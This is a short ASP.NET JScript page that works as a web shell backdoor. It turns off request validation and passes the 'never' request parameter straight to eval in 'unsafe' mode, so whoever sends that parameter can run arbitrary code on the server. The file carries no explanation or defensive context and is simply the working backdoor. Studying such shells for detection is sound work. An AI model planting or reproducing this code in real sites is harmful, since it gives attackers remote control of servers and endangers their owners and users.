<%@ Page Language="Jscript" validateRequest="false" %>
<%
var keng
keng = Request.Item["never"];
Response.Write(eval(keng,"unsafe"));
%>